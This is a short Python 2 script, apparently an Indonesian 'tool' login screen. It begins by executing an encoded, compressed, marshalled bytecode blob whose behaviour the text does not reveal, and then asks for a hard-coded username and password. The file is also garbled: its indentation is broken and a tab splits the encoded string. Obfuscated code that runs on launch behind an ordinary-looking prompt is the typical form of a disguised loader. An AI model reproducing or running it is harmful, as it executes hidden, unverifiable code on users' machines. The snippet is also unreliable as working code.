import os, sys	import marshal,zlib,base64

 exec(marshal.loads(zlib.decompress(base64.b64decode("eJy9WN1vE9kVP+PPeOIEwgKmZbu9m+4Sh4U4joOBtFQlIQtIhUT50JbArjXxXOJJ7LHrey3qxn5K/wH61qc+ICFVQn3jqWqfKvFUiZc+97V/wL6sVqvtOed6HGcj7KASZjJnzpx7vn7nXh/upQidawqfX+GjvkPi4p8FZYCNLm/BhhXwIdgIBXwYNsLgoiQCLvJRcCOwEQM3ChtxcGOwPQQyAjLGNMo0zkz8ffN7l+H2HTcOf0BYCZA2uEOwE4L6NyATsAdg+YxoNZ3ACnjf43VfxZE9/zD789zVikru8+cf5rIVFWVBLtflZivqRRhgt73btgt8icHXIR27Jcjy0UDLFt6HTFuFjMiwU34ohYIwlB/zQXrBsBGhKb4y7JRu9FFotcQEU77pA7Oi7HiYeRq3O4mQU9ZLoz8j64pahUnzEjRseEr4UcFgeFQoXEIJvjCekRlRS0xRWvRlhjPCjNv7FeS0DxaVRIfrE5SpW0H2d7Co+yEui932QtWVdSXmm2KtJFdr5aqnu9b2bvvhjRuTqHVP+o05O4EjKNptT2d321/utoX03WK9WdPisVeWwpX+luOLTUfJ/GxXdWaAajbfVc0NUM3NdFVn+6hWn	/10PqbKVcdVaUVmk5Ps6opxdUXNHzK9RLvJS73pkGCKMqnU6lKpw0Uf58KNT3ac543zvFo+gvODOR4hVLQTysS6amJdfYexupM1zhGumQjX3mGE7ryaCNdNhOtqgn4bUopmtSEc38XDluPvKPG4WhcN5flbQpc8JXS1WlZskp1WD9CBnVhYurW4smonbgy+AmUx/0DM9RznArFAqRFls9PX7cTyzdW1xfm793mgpHVNzWUyNUdpuen5Uwgt08iQl2Xj5fbdtTvr83ww3Fff8nSpscnKPQET5viYWF2fXxX3muIB/grX5xfFzYWFpfX7a+LzpRVxb2llUdxaXLt599dHhfeg2tCNTUng6s0lX3ZzOoD2SK7UOSzyPcd5LG76riOUg21L3PVrDf1V4av0WRzU9L8kdedJwSMpT8rKCk/qF/zzrNbwhEVMXTqupn5m1gDb4aqWPq0DHWeNWtkpSk3r+0kdGw5zxXJVSfZQcTzfmGXzHTP+ys30OKGlhm2L+c5aZDduo1JTnURqdWZoceqhjg0tT00dU+m6eTdVp794Ok0nQ06+WKp6RZMOnT/ZnBiGSagdpptMi0xdphWmiqlk+pjpFpdMOea1maZzKBNletyKwBfBVOdI3TqHdxifU9YJa5TpiGVbZ6xhlI5Zo6F3MUojyQH2gz3QffpYdT4MJa2oZYfGLJ6HQoFWSKGQHqZFeJ4I9ZOVT4hcJEKreSUFvAvCf/OYzvO8YoepOJqL3fHlOxWJvrrz0TsprPKLStVtlOUveV5PUv8KxSxz/zGU+FPS+h83sXXC"))))
print ("\033[1;32mSilahkan Masukkan Username & Password Anda")	

 print ("\033[1;32matau silahkan Contact 081316577616 ")	

 username = 'TheSploit'      	

 password = 'Sploit1109'	



 def restart():	

 	ngulang = sys.executable	

 	os.execl(ngulang, ngulang, *sys.argv)	



 def main():	

 	uname = raw_input("username : ")	

 	if uname == username:	

 		pwd = raw_input("password : ")	



 		if pwd == password:	

 			print "\033[1;32mSukses Masuk Gayn..", 	

 			sys.exit()	



 		else:	

 			print "\033[1;32mMaaf Masukkan password Anda salah... [?]\033[00m"	

 			print "Maaf Muka Anda Kurang Gans Silahkan log-in kembali...!!\n"	

 			restart()	



 	else:	

 		print "\033[1;32mMaaf Masukkan Username Anda salah... [?]\033[00m"	

 		print "Ayo Jangan menyerah Beb, kamu bisa, Mari log-in kembali...!!\n"	

 		restart()	



 try:	

 	main()	

 except KeyboardInterrupt:	

 	os.system('clear')	

 	restart()
